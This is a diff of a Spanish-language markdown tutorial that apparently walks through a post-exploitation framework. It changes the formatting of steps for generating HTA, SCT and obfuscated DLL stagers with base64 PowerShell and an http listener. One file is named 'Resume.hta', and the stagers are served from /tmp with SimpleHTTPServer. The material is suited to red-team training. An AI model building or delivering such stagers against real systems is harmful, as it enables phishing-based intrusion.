@@ -76,27 +76,34 @@ El resultado debe ser el siguiente:
 ![image](https://i.imgur.com/uqNHCBy.jpg)
 
 2.Crear Stagers
+
 -Generar Stager HTA:
-Type: windows/hta
-> Listner: http
-> Base64: True
-> Language: powershell
-> Outfile: /tmp/Resume.hta
+
+>Type: windows/hta
+Listner: http
+Base64: True
+Language: powershell
+Outfile: /tmp/Resume.hta
+
 -Generar Stager SCT:
+
 > Type: windows/launcher_sct
-> Listner: http
-> Base64: True
-> Language: powershell
+Listner: http
+Base64: True
+Language: powershell
+
 -Generar Stager DLL:
+
 > Type: windows/dll
-> Listner: http
-> Arch: x86
-> Language: powershell
-> OutFile: /tmp/launcher.dll
-> Obfuscate: True
-> ObfuscateCommand: Token\String\1
+Listner: http
+Arch: x86
+Language: powershell
+OutFile: /tmp/launcher.dll
+Obfuscate: True
+ObfuscateCommand: Token\String\1
 
 Resultado de la creación de Stagers:
+
 ![image](https://i.imgur.com/htm5bqB.jpg)
 
 3.Descargar Stagers en /tmp y usarlos con SimpleHTTPServer
